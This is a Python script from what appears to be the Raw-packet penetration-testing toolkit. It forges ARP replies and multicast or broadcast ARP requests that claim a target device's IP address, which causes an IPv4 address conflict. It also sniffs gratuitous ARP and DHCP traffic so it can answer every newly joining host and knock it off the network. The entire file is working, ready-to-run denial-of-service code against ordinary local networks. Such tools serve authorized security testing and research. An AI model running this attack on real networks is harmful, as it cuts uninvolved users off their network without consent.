#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
network_conflict_creator.py: Network conflict creator script
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from argparse import ArgumentParser
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion


# region Send ARP reply packets
def reply(request):
    try:
        if not args.replies and not args.requests:
            if 'ARP' in request.keys():
                if target['ip-address'] is not None:
                    if request['ARP']['sender-ip'] == target['ip-address'] and \
                            request['ARP']['sender-mac'] == target['mac-address']:
                        base.print_info('Send IPv4 Address Conflict ARP response to: ',
                                        target['ip-address'] + ' (' + target['mac-address'] + ')')
                        settings['make-conflict'] = False
                        raw_socket.send(conflict_packet['response'])
                else:
                    if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                            request['ARP']['opcode'] == 1 and \
                            request['ARP']['sender-ip'] == request['ARP']['target-ip']:
                        base.print_info('Sniff Gratuitous ARP request for ',
                                        request['ARP']['sender-ip'] + ' (' + request['Ethernet']['source'] + ')')
                        base.print_info('Send Gratuitous ARP reply for ',
                                        request['ARP']['sender-ip'] + ' (' + request['Ethernet']['source'] + ')')
                        raw_socket.send(arp.make_response(ethernet_src_mac=settings['mac-address'],
                                                          ethernet_dst_mac=request['Ethernet']['source'],
                                                          sender_mac=settings['mac-address'],
                                                          sender_ip=request['ARP']['sender-ip'],
                                                          target_mac=request['Ethernet']['source'],
                                                          target_ip=request['ARP']['sender-ip']))

        if 'DHCPv4' in request.keys():
            if request['DHCPv4'][53] == 4:
                base.print_success('DHCP Decline from: ', request['DHCPv4'][50] +
                                   ' (' + request['Ethernet']['source'] + ')',
                                   ' IPv4 address conflict detected!')
                if args.exit:
                    exit(0)

    except KeyboardInterrupt:
        raw_socket.close()
        base.print_info('Exit')
        exit(0)

    except KeyError:
        pass

    except TypeError:
        pass

# endregion


# region ARP sniffer
def arp_sniffer():
    if target['ip-address'] is not None:
        base.print_info('Sniff ARP or DHCP requests from: ',  str(target['ip-address']) +
                        ' (' + str(target['mac-address']) + ')')
        sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=reply,
                    filters={'Ethernet': {'source': target['mac-address']}})
    else:
        base.print_info('Sniff ARP or DHCP requests ...')
        sniff.start(protocols=['ARP', 'IPv4', 'UDP', 'DHCPv4'], prn=reply,
                    filters={'UDP': {'source-port': 68, 'destination-port': 67}})
# endregion


# region Main function
if __name__ == '__main__':

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawARP, RawSniff
    from raw_packet.Utils.tm import ThreadManager
    from raw_packet.Scanners.arp_scanner import ArpScan
    # endregion

    # region Init Raw-packet classes
    base: Base = Base()
    arp: RawARP = RawARP()
    arp_scan: ArpScan = ArpScan()
    sniff: RawSniff = RawSniff()
    thread_manager: ThreadManager = ThreadManager(2)
    # endregion

    # region Variables
    target: Dict[str, Union[None, str]] = {'ip-address': None, 'mac-address': None}
    conflict_packet: Dict[str, Union[None, bytes]] = {'request': None, 'response': None}
    settings: Dict[str, Union[bool, int, str]] = {'make-conflict': True}
    raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    # endregion

    try:

        # region Check User and Platform
        base.check_user()
        base.check_platform()
        # endregion
    
        # region Parse script arguments
        parser = ArgumentParser(description='Network conflict creator script')
        parser.add_argument('-i', '--interface', type=str, help='Set interface name for listen and send packets')
        parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
        parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
        parser.add_argument('--replies', action='store_true', help='Send only ARP replies')
        parser.add_argument('--requests', action='store_true', help='Send only ARP requests')
        parser.add_argument('--broadcast', action='store_true', help='Send broadcast ARP requests')
        parser.add_argument('-p', '--packets', type=int, help='Number of ARP packets (default: 10)', default=10)
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        parser.add_argument('-e', '--exit', action='store_true', help='Exit on success')
        args = parser.parse_args()
        # endregion
    
        # region Print banner
        if not args.quiet:
            base.print_banner()
        # endregion
        
        # region Network interface settings and Bind raw socket
        if args.interface is None:
            base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
        settings['network-interface'] = base.network_interface_selection(args.interface)
        settings['mac-address'] = base.get_interface_mac_address(settings['network-interface'])
        settings['number-of-packets'] = args.packets
        first_ip_address = base.get_first_ip_on_interface(settings['network-interface'])
        last_ip_address = base.get_last_ip_on_interface(settings['network-interface'])
        raw_socket.bind((settings['network-interface'], 0))
        # endregion
        
        # region Set target IP and MAC address
        if args.target_ip is not None:
            assert base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address), \
                'Bad value `-t, --target_ip`: ' + base.error_text(args.target_ip) + \
                '; Target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
            target['ip-address'] = args.target_ip
            if args.target_mac is None:
                base.print_info('Find MAC address of device with IP address: ', target['ip-address'], ' ...')
                target['mac-address'] = arp_scan.get_mac_address(network_interface=settings['network-interface'],
                                                                 target_ip_address=target['ip-address'],
                                                                 exit_on_failure=True,
                                                                 show_scan_percentage=False)
            else:
                assert base.mac_address_validation(args.target_mac), \
                    'Bad MAC address `-m, --target_mac`: ' + base.error_text(args.target_mac) + \
                    '; example MAC address: ' + base.info_text('12:34:56:78:90:ab')
                target['mac-address'] = args.target_mac
        # endregion

        # region Target IP address is not set - start ARP and DHCP sniffer
        if target['ip-address'] is None:
            arp_sniffer()
        # endregion

        # region Target IP address is set - make and send ARP conflict packets
        else:

            # region Make ARP conflict packets
            conflict_packet['response'] = arp.make_response(ethernet_src_mac=settings['mac-address'],
                                                            ethernet_dst_mac=target['mac-address'],
                                                            sender_mac=settings['mac-address'],
                                                            sender_ip=target['ip-address'],
                                                            target_mac=target['mac-address'],
                                                            target_ip=target['ip-address'])
            if args.broadcast:
                destination_mac_address = 'ff:ff:ff:ff:ff:ff'
            else:
                destination_mac_address = '33:33:00:00:00:01'
            conflict_packet['request'] = arp.make_request(ethernet_src_mac=settings['mac-address'],
                                                          ethernet_dst_mac=destination_mac_address,
                                                          sender_mac=settings['mac-address'],
                                                          sender_ip=target['ip-address'],
                                                          target_mac='00:00:00:00:00:00',
                                                          target_ip=base.get_random_ip_on_interface(
                                                              settings['network-interface']))
            # endregion

            # region Start ARP sniffer in thread
            thread_manager.add_task(arp_sniffer)
            # endregion

            # region Send ARP reply packets
            if args.replies:
                base.print_info('Send only ARP reply packets to: ',
                                str(target['ip-address']) + ' (' + str(target['mac-address']) + ')')
                for _ in range(settings['number-of-packets']):
                    raw_socket.send(conflict_packet['response'])
                    sleep(0.5)

                raw_socket.close()
            # endregion

            # region Send ARP request packets
            elif args.requests:
                base.print_info('Send only Multicast ARP request packets to: ',
                                str(target['ip-address']) + ' (' + str(target['mac-address']) + ')')
                for _ in range(settings['number-of-packets']):
                    raw_socket.send(conflict_packet['request'])
                    sleep(0.5)

                raw_socket.close()
            # endregion

            # region Send broadcast ARP request packets
            else:
                # region Start send ARP requests
                current_number_of_packets: int = 0
                while settings['make-conflict']:
                    if current_number_of_packets == settings['number-of-packets']:
                        break
                    else:
                        base.print_info('Send Multicast ARP request to: ',
                                        str(target['ip-address']) + ' (' + str(target['mac-address']) + ')')
                        raw_socket.send(conflict_packet['request'])
                        sleep(3)
                        current_number_of_packets += 1
                # endregion
            # endregion

        # endregion

    except KeyboardInterrupt:
        raw_socket.close()
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        raw_socket.close()
        base.print_error(Error.args[0])
        exit(1)

# endregion
